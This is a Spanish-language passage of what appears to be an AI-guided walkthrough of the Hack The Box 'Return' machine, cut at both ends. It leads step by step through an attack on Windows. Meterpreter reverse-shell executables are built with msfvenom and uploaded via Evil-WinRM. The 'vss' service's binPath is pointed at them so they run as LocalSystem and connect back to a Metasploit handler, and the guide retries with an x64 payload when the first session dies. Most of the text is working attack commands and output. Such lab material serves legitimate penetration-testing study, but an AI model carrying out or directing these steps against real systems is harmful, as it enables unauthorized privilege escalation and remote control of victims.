se corregirá antes de ejecutar el listener.
```
### Ejecutamos:

[msf](Jobs:0 Agents:0) exploit(multi/handler) >> show options

Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.15.26      yes       The listen address (an interface may be specified)
   LPORT     1337             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target



View the full module info with the info, or info -d command.

### Objetivo

Arrancar el handler de Metasploit para dejarlo escuchando en `10.10.15.26:1337`.

### Hechos verificados

El handler está configurado correctamente:

```text
PAYLOAD  windows/meterpreter/reverse_tcp
LHOST    10.10.15.26
LPORT    1337
```

Las opciones coinciden con el ejecutable `shell.exe` generado previamente.

### Suposiciones

El puerto `1337` está libre y Metasploit podrá quedarse a la espera de la conexión entrante.

### Método

El siguiente paso único es arrancar el listener. No se tocará todavía la máquina víctima ni el servicio `vss`.

### Respuesta

La configuración es correcta. Ahora deja Metasploit escuchando.

### Comandos

En Metasploit:

```text
run
```

### Comprobaciones

Pásame solo la salida inicial de `run`.

Criterio de decisión:

```text
Si Metasploit queda esperando conexión:
el siguiente paso será subir shell.exe a la víctima.

Si falla por puerto ocupado u otro error:
se corrige antes de tocar vss.
```
### Ejecutamos:

[msf](Jobs:0 Agents:0) exploit(multi/handler) >> run
[*] Started reverse TCP handler on 10.10.15.26:1337 

### Objetivo

Subir `shell.exe` a la máquina víctima ahora que el handler de Metasploit ya está escuchando.

### Hechos verificados

Metasploit está escuchando correctamente en:

```text
10.10.15.26:1337
```

La salida confirma:

```text
[*] Started reverse TCP handler on 10.10.15.26:1337
```

El ejecutable `shell.exe` ya existe localmente en el directorio del laboratorio y fue generado para conectar contra ese mismo `LHOST` y `LPORT`.

### Suposiciones

La sesión Evil-WinRM sigue abierta como `return\svc-printer`.

`Evil-WinRM` resolverá `shell.exe` desde el directorio local del laboratorio:

```text
/home/r4mon/pentest/targets/HTB/easy/Return/shell.exe
```

### Método

El siguiente paso único es subir `shell.exe` a:

```text
C:\Users\svc-printer\Documents\shell.exe
```

No se modificará todavía el servicio `vss`.

### Respuesta

El listener ya está preparado. Ahora vuelve a Evil-WinRM y sube solo el binario.

### Comandos

En Evil-WinRM:

```powershell
upload shell.exe
```

### Comprobaciones

Pásame solo la salida de `upload shell.exe`.

Criterio de decisión:

```text
Si la subida funciona:
el siguiente paso será comprobar que shell.exe existe en la víctima.

Si la subida falla:
se revisará la ruta local de shell.exe antes de tocar vss.
```
### Ejecutamos:

*Evil-WinRM* PS C:\Users\svc-printer\Documents> upload shell.exe
                                        
Info: Uploading /home/r4mon/pentest/targets/HTB/easy/Return/shell.exe to C:\Users\svc-printer\Documents\shell.exe
                                        
Data: 98400 bytes of 98400 bytes copied
                                        
Info: Upload successful!
### Objetivo

Verificar que `shell.exe` existe en la máquina víctima antes de usarlo con el servicio `vss`.

### Hechos verificados

La subida de `shell.exe` se completó correctamente:

```text
Data: 98400 bytes of 98400 bytes copied
Info: Upload successful!
```

El destino remoto indicado es:

```text
C:\Users\svc-printer\Documents\shell.exe
```

El handler de Metasploit sigue preparado en:

```text
10.10.15.26:1337
```

### Suposiciones

El fichero debería estar disponible en el directorio actual de la sesión Evil-WinRM.

Antes de modificar `vss`, hay que confirmar que el ejecutable está presente y tiene tamaño válido.

### Método

Siguiente paso único:

```text
Comprobar la existencia de shell.exe en la máquina víctima.
```

### Respuesta

La subida ha funcionado. Ahora solo comprobamos que el fichero está realmente en la víctima.

### Comandos

En Evil-WinRM:

```powershell
Get-ChildItem -Force C:\Users\svc-printer\Documents\shell.exe
```

### Comprobaciones

Pásame solo la salida de ese comando.

Criterio de decisión:

```text
Si shell.exe aparece con tamaño válido:
el siguiente paso será restaurar/confirmar vss antes de configurarlo.

Si no aparece:
se revisará la ruta remota antes de modificar el servicio.
```
*Evil-WinRM* PS C:\Users\svc-printer\Documents> Get-ChildItem -Force C:\Users\svc-printer\Documents\shell.exe


    Directory: C:\Users\svc-printer\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         5/8/2026  10:17 AM          73802 shell.exe

### Objetivo

Confirmar que el servicio `vss` sigue restaurado antes de configurarlo para ejecutar `shell.exe`.

### Hechos verificados

`shell.exe` existe en la máquina víctima:

```text
C:\Users\svc-printer\Documents\shell.exe
```

El tamaño remoto coincide con el ejecutable generado:

```text
73802 shell.exe
```

El handler de Metasploit está escuchando en:

```text
10.10.15.26:1337
```

### Suposiciones

Antes de modificar de nuevo `vss`, hay que comprobar que el servicio no conserva ningún `binPath` anterior.

### Método

Siguiente paso único:

```text
Consultar la configuración actual de vss.
```

### Respuesta

Bien. El binario ya está en la víctima. Ahora solo confirmamos que `vss` está limpio antes de tocarlo.

### Comandos

En Evil-WinRM:

```powershell
sc.exe qc vss
```

### Comprobaciones

Pásame solo la salida de `sc.exe qc vss`.

Criterio de decisión:

```text
Si BINARY_PATH_NAME es C:\Windows\system32\vssvc.exe:
el siguiente paso será configurar vss con shell.exe.

Si apunta a otra cosa:
se restaurará antes de continuar.
```
*Evil-WinRM* PS C:\Users\svc-printer\Documents> sc.exe qc vss
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: vss
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Windows\system32\vssvc.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Volume Shadow Copy
        DEPENDENCIES       : RPCSS
        SERVICE_START_NAME : LocalSystem

### Objetivo

Configurar temporalmente el servicio `vss` para ejecutar `shell.exe` como `LocalSystem`.

### Hechos verificados

`shell.exe` existe en la víctima:

```text
C:\Users\svc-printer\Documents\shell.exe
```

El servicio `vss` está limpio y restaurado:

```text
BINARY_PATH_NAME   : C:\Windows\system32\vssvc.exe
SERVICE_START_NAME : LocalSystem
```

El handler de Metasploit está escuchando en:

```text
10.10.15.26:1337
```

### Suposiciones

Al modificar `BINARY_PATH_NAME` hacia `shell.exe`, el servicio debería ejecutar el binario con el contexto de `LocalSystem`.

### Método

Siguiente paso único: cambiar el `binPath` de `vss` para que apunte al ejecutable ya subido.

No se inicia todavía el servicio hasta comprobar que el cambio se aplicó correctamente.

### Respuesta

El estado es correcto. Ahora solo configura `vss` con `shell.exe`.

### Comandos

En Evil-WinRM:

```powershell
sc.exe config vss binPath= "C:\Users\svc-printer\Documents\shell.exe"
```

### Comprobaciones

Pásame solo la salida de ese comando.

Criterio de decisión:

```text
Si devuelve ChangeServiceConfig SUCCESS:
el siguiente paso será comprobar el binPath con sc.exe qc vss.

Si devuelve error:
se corrige antes de iniciar el servicio.
```

### Ejecutamos:

*Evil-WinRM* PS C:\Users\svc-printer\Documents> sc.exe config vss binPath= "C:\Users\svc-printer\Documents\shell.exe"
[SC] ChangeServiceConfig SUCCESS

### Objetivo

Comprobar que `vss` quedó configurado exactamente con `shell.exe` antes de iniciar el servicio.

### Hechos verificados

La modificación del servicio se aplicó correctamente:

```text
[SC] ChangeServiceConfig SUCCESS
```

`shell.exe` existe en:

```text
C:\Users\svc-printer\Documents\shell.exe
```

El handler de Metasploit está escuchando en:

```text
10.10.15.26:1337
```

### Suposiciones

Aunque la modificación haya devuelto éxito, hay que verificar el `BINARY_PATH_NAME` antes de arrancar el servicio.

### Método

Siguiente paso único: consultar la configuración actual de `vss`.

### Respuesta

Bien. Ahora no arranques aún el servicio. Primero confirmamos que el `binPath` apunta a `shell.exe`.

### Comandos

En Evil-WinRM:

```powershell
sc.exe qc vss
```

### Comprobaciones

Pásame solo la salida de `sc.exe qc vss`.

Criterio de decisión:

```text
Si BINARY_PATH_NAME apunta a C:\Users\svc-printer\Documents\shell.exe:
el siguiente paso será iniciar vss.

Si apunta a otra ruta:
se corrige antes de iniciar el servicio.
```
*Evil-WinRM* PS C:\Users\svc-printer\Documents> sc.exe qc vss
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: vss
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Users\svc-printer\Documents\shell.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Volume Shadow Copy
        DEPENDENCIES       : RPCSS
        SERVICE_START_NAME : LocalSystem

### Objetivo

Iniciar el servicio `vss` para ejecutar `shell.exe` como `LocalSystem` y comprobar si Metasploit recibe una sesión Meterpreter.

### Hechos verificados

`vss` está configurado para ejecutar el binario subido:

```text
BINARY_PATH_NAME : C:\Users\svc-printer\Documents\shell.exe
```

El servicio se ejecuta como:

```text
SERVICE_START_NAME : LocalSystem
```

El handler de Metasploit está escuchando en:

```text
10.10.15.26:1337
```

### Suposiciones

Al iniciar `vss`, el ejecutable `shell.exe` debería ejecutarse con el contexto del servicio.

El error `1053` puede aparecer de nuevo, pero el indicador importante será si Metasploit recibe sesión.

### Método

Siguiente paso único:

```text
Iniciar vss y observar si llega sesión Meterpreter.
```

### Respuesta

Todo está listo. Ahora inicia el servicio una sola vez y mira Metasploit.

### Comandos

En Evil-WinRM:

```powershell
sc.exe start vss
```

### Comprobaciones

Pásame solo:

```text
1. La salida de sc.exe start vss.
2. La salida nueva que aparezca en Metasploit.
```

Criterio de decisión:

```text
Si Metasploit abre una sesión:
el siguiente paso será confirmar usuario con getuid.

Si no llega sesión:
se revisará si el handler sigue activo y si shell.exe fue bloqueado o terminó antes de conectar.

Si aparece error 1053 pero Metasploit recibe sesión:
el error se considera secundario y la ejecución se considera válida.
```
### Ejecutamos:

*Evil-WinRM* PS C:\Users\svc-printer\Documents> sc.exe start vss


[msf](Jobs:0 Agents:0) exploit(multi/handler) >> run
[*] Started reverse TCP handler on 10.10.15.26:1337 
[*] Sending stage (177734 bytes) to 10.129.95.241
[*] Meterpreter session 1 opened (10.10.15.26:1337 -> 10.129.95.241:53876) at 2026-05-08 19:05:36 +0200

(Meterpreter 1)(C:\Windows\system32) > 
[*] 10.129.95.241 - Meterpreter session 1 closed.  Reason: Died

### Objetivo

Restaurar `vss` antes de repetir ningún intento, porque la sesión Meterpreter llegó a abrirse pero murió enseguida y el servicio sigue apuntando a `shell.exe`.

### Hechos verificados

Metasploit recibió conexión desde la víctima:

```text
[*] Sending stage (177734 bytes) to 10.129.95.241
[*] Meterpreter session 1 opened (10.10.15.26:1337 -> 10.129.95.241:53876)
```

La sesión se cerró inmediatamente:

```text
[*] 10.129.95.241 - Meterpreter session 1 closed. Reason: Died
```

Esto confirma que `shell.exe` llegó a ejecutarse, pero la sesión no permaneció estable.

### Suposiciones

La ejecución mediante `vss` funciona.

El problema actual es estabilidad de la sesión, no falta de ejecución.

Antes de repetir, hay que dejar `vss` restaurado para no acumular estado alterado.

### Método

Siguiente paso único:

```text
Restaurar el binPath original de vss.
```

### Respuesta

La sesión llegó, así que la vía está viva. Pero murió demasiado rápido para migrar.

Ahora no repetimos todavía. Primero restauramos `vss`.

### Comandos

En Evil-WinRM:

```powershell
sc.exe config vss binPath= "C:\Windows\system32\vssvc.exe"
```

### Comprobaciones

Pásame solo la salida de ese comando.

Criterio de decisión:

```text
Si devuelve ChangeServiceConfig SUCCESS:
el siguiente paso será confirmar con sc.exe qc vss.

Si devuelve error:
no seguimos hasta restaurar el servicio.
```
### Ejecutamos:

*Evil-WinRM* PS C:\Users\svc-printer\Documents> sc.exe config vss binPath= "C:\Windows\system32\vssvc.exe"
[SC] ChangeServiceConfig SUCCESS

### Objetivo

Confirmar que `vss` ha quedado restaurado a su binario original antes de ajustar la táctica para conseguir una sesión más estable.

### Hechos verificados

La restauración del servicio ha sido aceptada:

```text
[SC] ChangeServiceConfig SUCCESS
```

La sesión Meterpreter anterior llegó a abrirse, pero murió inmediatamente, por lo que la ejecución está confirmada y la estabilidad queda pendiente.

### Suposiciones

`vss` debería volver a apuntar a:

```text
C:\Windows\system32\vssvc.exe
```

Todavía hay que comprobarlo con la configuración real del servicio.

### Método

Siguiente paso único:

```text
Consultar la configuración actual de vss.
```

### Respuesta

Bien. Ahora solo confirmamos que el servicio quedó limpio.

### Comandos

En Evil-WinRM:

```powershell
sc.exe qc vss
```

### Comprobaciones

Pásame solo la salida de `sc.exe qc vss`.

Criterio de decisión:

```text
Si BINARY_PATH_NAME es C:\Windows\system32\vssvc.exe:
vss queda restaurado y podremos ajustar la táctica.

Si sigue apuntando a shell.exe:
no avanzamos hasta restaurarlo.
```
### Ejecutamos:

*Evil-WinRM* PS C:\Users\svc-printer\Documents> sc.exe qc vss
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: vss
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Windows\system32\vssvc.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Volume Shadow Copy
        DEPENDENCIES       : RPCSS
        SERVICE_START_NAME : LocalSystem
### Objetivo

Cambiar a un payload de 64 bits para mejorar la estabilidad de la sesión privilegiada antes de volver a modificar `vss`.

### Hechos verificados

El servicio `vss` ha quedado restaurado correctamente:

```text
BINARY_PATH_NAME   : C:\Windows\system32\vssvc.exe
SERVICE_START_NAME : LocalSystem
```

La ejecución mediante `vss` funciona, porque Metasploit llegó a recibir una sesión:

```text
Meterpreter session 1 opened
```

La sesión murió inmediatamente:

```text
Reason: Died
```

### Suposiciones

La máquina es Windows Server 2019 / build 17763, por lo que un payload x64 puede ser más adecuado que el payload x86 usado inicialmente.

Antes de tocar otra vez el servicio, se debe preparar un nuevo binario local y comprobar que se genera correctamente.

### Método

La rama principal sigue siendo:

```text
Escalada por modificación de servicio LocalSystem
```

El problema actual no es la primitiva de escalada, sino la estabilidad de la sesión obtenida.

El siguiente paso único es generar un nuevo ejecutable x64 en Parrot.

### Respuesta

`vss` está limpio. Bien hecho.

Ahora cambiaremos la táctica con un binario x64. Solo generamos el fichero local; no lo subas todavía.

### Comandos

En una terminal local de Parrot:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.15.26 LPORT=4444 -f exe -o shell64.exe
```

### Comprobaciones

Pásame solo la salida de `msfvenom`.

Criterio de decisión:

```text
Si shell64.exe se genera correctamente:
el siguiente paso será verificar que existe y tiene tamaño válido.

Si msfvenom falla:
se corregirá el error antes de tocar Metasploit o vss.
```
### Ejecutamos:

❯ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.15.26 LPORT=4444 -f exe -o shell64.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: shell64.exe

### Objetivo

Verificar que `shell64.exe` se ha generado correctamente en Parrot antes de configurar Metasploit o subirlo a la máquina víctima.

### Hechos verificados

`msfvenom` ha generado un payload x64 para Windows:

```text
windows/x64/meterpreter/reverse_tcp
```

La IP y puerto configurados son:

```text
LHOST=10.10.15.26
LPORT=4444
```

El fichero se ha guardado como:

```text
shell64.exe
```

El tamaño final informado es:

```text
7168 bytes
```

### Suposiciones

El fichero `shell64.exe` debería existir ahora en el directorio local del laboratorio:

```text
/home/r4mon/pentest/targets/HTB/easy/Return/shell64.exe
```

Antes de tocar Metasploit o volver a modificar `vss`, hay que confirmar que el binario existe y tiene tamaño válido.

### Método

Siguiente paso único:

```text
Comprobar existencia y tamaño de shell64.exe en Parrot.
```

### Respuesta

El binario x64 se ha generado correctamente. Ahora solo verificamos el fichero local.

### Comandos

En la terminal local de Parrot:

```bash
ls -lh ./shell64.exe
```

### Comprobaciones

Pásame solo la salida de ese comando.

Criterio de decisión:

```text
Si shell64.exe existe y pesa alrededor de 7 KB:
el siguiente paso será preparar un handler nuevo en Metasploit para windows/x64/meterpreter/reverse_tcp en el puerto 4444.

Si no existe o pesa 0:
se regenerará antes de continuar.
```
### Ejecutamos:

❯ ls -lh ./shell64.exe
.rw-r--r-- r4mon r4mon 7.0 KB Fri May  8 19:10:58 2026  ./shell64.exe

### Objetivo

Preparar Metasploit para recibir el nuevo payload x64, empezando por configurar el payload correcto del handler.

### Hechos verificados

`shell64.exe` existe localmente en Parrot y tiene tamaño válido:

```text
shell64.exe
7.0 KB
```

El payload generado es:

```text
windows/x64/meterpreter/reverse_tcp
```

El puerto configurado en el binario es:

```text
4444
```

### Suposiciones

Metasploit sigue abierto en el módulo `exploit/multi/handler`.

El handler anterior todavía puede tener configurado el payload x86 y el puerto `1337`, por lo que hay que cambiarlo antes de ejecutar nada.

### Método

Se configurará primero el payload correcto. No se tocará aún `LHOST`, `LPORT`, la víctima ni el servicio `vss`.

### Respuesta

Correcto. El binario x64 está listo.

Ahora ve a Metasploit y ejecuta **solo** el cambio de payload.

### Comandos

En Metasploit:

```text
set PAYLOAD windows/x64/meterpreter/reverse_tcp
```

### Comprobaciones

Pásame solo la salida de ese comando.

Criterio de decisión:

```text
Si confirma PAYLOAD => windows/x64/meterpreter/reverse_tcp:
el siguiente paso será configurar LHOST.

Si da error:
se corregirá el payload antes de continuar.
```
### Ejecutamos:

[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set PAYLOAD windows/x64/meterpreter/reverse_tcp
PAYLOAD => windows/x64/meterpreter/reverse_tcp

### Objetivo

Configurar `LHOST` en Metasploit para el nuevo handler x64.

### Hechos verificados

El payload del handler se ha cambiado correctamente a:

```text
windows/x64/meterpreter/reverse_tcp
```

Metasploit confirmó:

```text
PAYLOAD => windows/x64/meterpreter/reverse_tcp
```

El binario `shell64.exe` fue generado para conectar contra:

```text
10.10.15.26
```

### Suposiciones

La IP `10.10.15.26` sigue siendo la IP activa de la interfaz VPN `tun0`.

### Método

Siguiente paso único:

```text
Configurar LHOST con la misma IP usada al generar shell64.exe.
```

### Respuesta

Bien. Ahora configura solo `LHOST`.

### Comandos

En Metasploit:

```text
set LHOST 10.10.15.26
```

### Comprobaciones

Pásame solo la salida de ese comando.

Criterio de decisión:

```text
Si confirma LHOST => 10.10.15.26:
el siguiente paso será configurar LPORT.

Si muestra error:
se corrige antes de seguir.
```
### Ejecutamos:

[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LHOST 10.10.15.26
LHOST => 10.10.15.26

### Objetivo

Configurar `LPORT` en Metasploit para que coincida con el puerto usado al generar `shell64.exe`.

### Hechos verificados

`LHOST` ha quedado configurado correctamente:

```text
LHOST => 10.10.15.26
```

El binario `shell64.exe` fue generado con:

```text
LPORT=4444
```

### Suposiciones

El puerto `4444` está libre y será el listener del nuevo payload x64.

### Método

Siguiente paso único:

```text
Configurar LPORT con el puerto 4444.
```

### Respuesta

Correcto. Ahora configura solo `LPORT`.

### Comandos

En Metasploit:

```text
set LPORT 4444
```

### Comprobaciones

Pásame solo la salida de ese comando.

Criterio de decisión:

```text
Si confirma LPORT => 4444:
el siguiente paso será revisar show options.

Si devuelve error:
se corregirá antes de arrancar el handler.
```
### Ejecutamos:

[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LPORT 4444
LPORT => 4444

### Objetivo

Revisar la configuración del handler x64 antes de arrancarlo.

### Hechos verificados

`LPORT` ha quedado configurado correctamente:

```text
LPORT => 4444
```

El handler debería estar configurado ahora con:

```text
PAYLOAD: windows/x64/meterpreter/reverse_tcp
LHOST: 10.10.15.26
LPORT: 4444
```

### Suposiciones

Antes de ejecutar el listener, hay que confirmar visualmente que las opciones coinciden con `shell64.exe`.

### Método

Siguiente paso único:

```text
Mostrar las opciones actuales del handler.
```

### Respuesta

Bien. Ahora solo revisamos opciones. No ejecutes todavía `run`.

### Comandos

En Metasploit:

```text
show options
```

### Comprobaciones

Pásame solo la salida de `show options`.

Criterio de decisión:

```text
Si PAYLOAD, LHOST y LPORT coinciden:
el siguiente paso será arrancar el handler.

Si algún valor no coincide:
se corrige antes de seguir.
```
### Ejecutamos:

[msf](Jobs:0 Agents:0) exploit(multi/handler) >> show options

Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.15.26      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target



View the full module info with the info, or info -d command.

### Objetivo

Arrancar el handler x64 de Metasploit para dejarlo escuchando en `10.10.15.26:4444`.

### Hechos verificados

El handler está configurado correctamente:

```text
PAYLOAD  windows/x64/meterpreter/reverse_tcp
LHOST    10.10.15.26
LPORT    4444
```

### Suposiciones

El puerto `4444` está libre y Metasploit podrá recibir la conexión de `shell64.exe`.

### Método

Siguiente paso único:

```text
Arrancar el handler.
```

No se sube todavía `shell64.exe` ni se toca `vss`.

### Respuesta

La configuración es correcta. Ahora deja Metasploit escuchando.

### Comandos

En Metasploit:

```text
run
```

### Comprobaciones

Pásame solo la salida inicial de `run`.

Criterio de decisión:

```text
Si aparece Started reverse TCP handler on 10.10.15.26:4444:
el siguiente paso será subir shell64.exe a la víctima.

Si aparece error:
se corrige antes de tocar la máquina víctima.
```
### Ejecutamos:

[msf](Jobs:0 Agents:0) exploit(multi/handler) >> run
[*] Started reverse TCP handler on 10.10.15.26:4444

### Objetivo

Subir `shell64.exe` a la máquina víctima ahora que el handler x64 de Metasploit ya está escuchando.

### Hechos verificados

Metasploit está escuchando correctamente en:

```text
10.10.15.26:4444
```

La salida confirma:

```text
[*] Started reverse TCP handler on 10.10.15.26:4444
```

El binario `shell64.exe` existe localmente y fue generado para ese mismo `LHOST` y `LPORT`.

### Suposiciones

La sesión Evil-WinRM sigue abierta como `return\svc-printer`.

Evil-WinRM debería resolver `shell64.exe` desde el directorio local del laboratorio:

```text
/home/r4mon/pentest/targets/HTB/easy/Return/shell64.exe
```

### Método

El siguiente paso único es subir `shell64.exe` a la máquina víctima.

No se modificará todavía el servicio `vss`.

### Respuesta

El handler x64 ya está preparado. Ahora vuelve a Evil-WinRM y sube solo el binario.

### Comandos

En Evil-WinRM:

```powershell
upload shell64.exe
```

### Comprobaciones

Pásame solo la salida de `upload shell64.exe`.

Criterio de decisión:

```text
Si la subida funciona:
el siguiente paso será comprobar que shell64.exe existe en la víctima.

Si la subida falla:
se revisará la ruta local de shell64.exe antes de tocar vss.
```
### Ejecutamos:

*Evil-WinRM* PS C:\Users\svc-printer\Documents> upload shell64.exe
                                        
Info: Uploading /home/r4mon/pentest/targets/HTB/easy/Return/shell64.exe to C:\Users\svc-printer\Documents\shell64.exe
                                        
Data: 9556 bytes of 9556 bytes copied
                                        
Info: Upload successful!

### Objetivo

Verificar que `shell64.exe` existe en la máquina víctima antes de volver a modificar el servicio `vss`.

### Hechos verificados

La subida de `shell64.exe` se completó correctamente:

```text
Data: 9556 bytes of 9556 bytes copied
Info: Upload successful!
```

El destino remoto indicado es:

```text
C:\Users\svc-printer\Documents\shell64.exe
```

El handler x64 de Metasploit está escuchando en:

```text
10.10.15.26:4444
```

### Suposiciones

El fichero debería estar disponible en el directorio actual de la sesión Evil-WinRM.

Antes de usarlo como `binPath`, hay que confirmar que existe y que tiene tamaño válido en la víctima.

### Método

Siguiente paso único:

```text
Comprobar la existencia de shell64.exe en la máquina víctima.
```

### Respuesta

La subida ha funcionado. Ahora solo comprobamos que el binario está realmente en la víctima.

### Comandos

En Evil-WinRM:

```powershell
Get-ChildItem -Force C:\Users\svc-printer\Documents\shell64.exe
```

### Comprobaciones

Pásame solo la salida de ese comando.

Criterio de decisión:

```text
Si shell64.exe aparece con tamaño válido:
el siguiente paso será confirmar que vss sigue restaurado.

Si no aparece:
se revisará la ruta remota antes de modificar el servicio.
```
### Ejecutamos:

*Evil-WinRM* PS C:\Users\svc-printer\Documents> Get-ChildItem -Force C:\Users\svc-printer\Documents\shell64.exe


    Directory: C:\Users\svc-printer\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         5/8/2026  10:36 AM           7168 shell64.exe

### Objetivo

Confirmar que el servicio `vss` sigue restaurado antes de configurarlo para ejecutar `shell64.exe`.

### Hechos verificados

`shell64.exe` existe en la máquina víctima:

```text
C:\Users\svc-printer\Documents\shell64.exe
```

El tamaño remoto es coherente con el binario generado:

```text
7168 shell64.exe
```

El handler x64 de Metasploit está escuchando en:

```text
10.10.15.26:4444
```

### Suposiciones

El servicio `vss` debería seguir apuntando a su binario original, pero hay que comprobarlo antes de modificar nada.

### Método

Siguiente paso único:

```text
Consultar la configuración actual de vss.
```

No se configura todavía `shell64.exe`.

### Respuesta

Correcto. El binario x64 ya está en la víctima.

Ahora solo comprobamos que `vss` está limpio antes de tocarlo.

### Comandos

En Evil-WinRM:

```powershell
sc.exe qc vss
```

### Comprobaciones

Pásame solo la salida de `sc.exe qc vss`.

Criterio de decisión:

```text
Si BINARY_PATH_NAME es C:\Windows\system32\vssvc.exe:
el siguiente paso será configurar vss con shell64.exe.

Si apunta a otra cosa:
se restaurará antes de continuar.
```
### Ejecutamos:

*Evil-WinRM* PS C:\Users\svc-printer\Documents> sc.exe qc vss
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: vss
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Windows\system32\vssvc.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Volume Shadow Copy
        DEPENDENCIES       : RPCSS
        SERVICE_START_NAME : LocalSystem

### Objetivo

Configurar temporalmente el servicio `vss` para ejecutar `shell64.exe` como `LocalSystem`.

### Hechos verificados

`shell64.exe` existe en la máquina víctima:

```text
C:\Users\svc-printer\Documents\shell64.exe
```

El servicio `vss` está restaurado y limpio:

```text
BINARY_PATH_NAME   : C:\Windows\system32\vssvc.exe
SERVICE_START_NAME : LocalSystem
```

El handler x64 de Metasploit está escuchando en:

```text
10.10.15.26:4444
```

### Suposiciones

Al cambiar el `BINARY_PATH_NAME` de `vss` hacia `shell64.exe`, el binario se ejecutará con el contexto del servicio, es decir, `LocalSystem`.

### Método

Siguiente paso único:

```text
Cambiar el binPath de vss para que apunte a shell64.exe.
```

No se iniciará todavía el servicio hasta confirmar que el cambio se ha aplicado correctamente.

### Respuesta

El estado es correcto. Ahora configura `vss` con el binario x64.

### Comandos

En Evil-WinRM:

```powershell
sc.exe config vss binPath= "C:\Users\svc-printer\Documents\shell64.exe"
```

### Comprobaciones

Pásame solo la salida de ese comando.

Criterio de decisión:

```text
Si devuelve ChangeServiceConfig SUCCESS:
el siguiente paso será comprobar el binPath con sc.exe qc vss.

Si devuelve error:
se corregirá antes de iniciar el servicio.
```
### Ejecutamos:

*Evil-WinRM* PS C:\Users\svc-printer\Documents> sc.exe config vss binPath= "C:\Users\svc-printer\Documents\shell64.exe"
[SC] ChangeServiceConfig SUCCESS

### Objetivo

Comprobar que `vss` quedó configurado exactamente con `shell64.exe` antes de iniciar el servicio.

### Hechos verificados

La modificación del servicio se aplicó correctamente:

```text
[SC] ChangeServiceConfig SUCCESS
```

`shell64.exe` existe en:

```text
C:\Users\svc-printer\Documents\shell64.exe
```

El handler x64 está escuchando en:

```text
10.10.15.26:4444
```

### Suposiciones

Aunque `ChangeServiceConfig` haya devuelto éxito, hay que verificar el `BINARY_PATH_NAME` antes de arrancar el servicio.

### Método

Siguiente paso único: consultar la configuración actual de `vss`.

### Respuesta

Bien. Ahora no arranques aún el servicio. Primero confirmamos que el `binPath` apunta al binario x64.

### Comandos

En Evil-WinRM:

```powershell
sc.exe qc vss
```

### Comprobaciones

Pásame solo la salida de `sc.exe qc vss`.

Criterio de decisión:

```text
Si BINARY_PATH_NAME apunta a C:\Users\svc-printer\Documents\shell64.exe:
el siguiente paso será iniciar vss.

Si apunta a otra ruta:
se corrige antes de iniciar el servicio.
```

### Ejecutamos:

*Evil-WinRM* PS C:\Users\svc-printer\Documents> sc.exe qc vss
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: vss
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Users\svc-printer\Documents\shell64.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Volume Shadow Copy
        DEPENDENCIES       : RPCSS
        SERVICE_START_NAME : LocalSystem

### Objetivo

Iniciar el servicio `vss` para ejecutar `shell64.exe` como `LocalSystem` y comprobar si Metasploit recibe una sesión Meterpreter estable.

### Hechos verificados

`vss` está configurado para ejecutar el binario x64:

```text
BINARY_PATH_NAME : C:\Users\svc-printer\Documents\shell64.exe
```

El servicio se ejecuta como:

```text
SERVICE_START_NAME : LocalSystem
```

El handler x64 de Metasploit está escuchando en:

```text
10.10.15.26:4444
```

### Suposiciones

Al iniciar `vss`, el binario `shell64.exe` debería conectar contra el handler configurado.

Puede aparecer de nuevo el error `1053`, pero el indicador importante será si Metasploit abre sesión.

### Método

Siguiente paso único:

```text
Iniciar vss y observar Metasploit.
```

No se ejecuta nada más hasta ver si llega sesión.

### Respuesta

Todo está preparado. Ahora inicia `vss` una sola vez y mira Metasploit.

### Comandos

En Evil-WinRM:

```powershell
sc.exe start vss
```

### Comprobaciones

Pásame solo:

```text
1. La salida de sc.exe start vss.
2. La salida nueva que aparezca en Metasploit.
```

Criterio de decisión:

```text
Si Metasploit abre sesión y queda viva:
el siguiente paso será ejecutar getuid.

Si Metasploit abre sesión pero muere:
restauraremos vss y ajustaremos estabilidad.

Si no llega sesión:
